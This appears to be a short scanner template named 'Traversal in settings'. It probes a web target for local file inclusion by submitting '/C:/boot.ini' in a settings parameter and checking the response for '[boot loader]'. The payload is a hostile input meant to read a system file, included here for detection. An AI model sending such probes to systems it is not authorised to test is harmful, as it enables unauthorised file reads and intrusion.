id: lfi6-0224
name: 'Traversal in settings'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via settings'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      settings:
        - '/C:/boot.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[boot loader]'
